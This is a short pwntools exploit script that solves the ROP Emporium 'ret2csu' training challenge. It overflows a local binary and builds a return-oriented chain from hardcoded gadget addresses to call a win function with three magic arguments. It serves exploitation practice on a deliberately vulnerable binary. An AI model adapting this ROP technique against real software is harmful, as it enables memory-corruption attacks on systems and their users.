from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge8/ret2csu'
bin= ELF(bin)
context.binary, context.log_level = bin, 'debug'

offset= 40

win1= 0xdeadbeefdeadbeef
win2= 0xcafebabecafebabe
win3= 0xd00df00dd00df00d

calljunk = 0x600e48
ret2winplt = 0x400510

pop_rbx_rbp_r12131415= 0x000000000040069a
mov_rdxr15_rsir14 = 0x0000000000400680
pop_rdi = 0x00000000004006a3

rop= ROP(bin)

ret2csu = b'A' * offset  
ret2csu += p64(pop_rbx_rbp_r12131415)
ret2csu += p64(0)
ret2csu += p64(1)
ret2csu += p64(calljunk)
ret2csu += p64(0)
ret2csu += p64(win2)
ret2csu += p64(win3)
ret2csu += p64(mov_rdxr15_rsir14)
ret2csu += p64(0) * 7                   # 6 junk qwords for 6 pops and 1 for add rsp 0x8
ret2csu += p64(pop_rdi)
ret2csu += p64(win1)
ret2csu += p64(0x400510)

p= process(bin.path)
p.sendline(ret2csu)
p.interactive()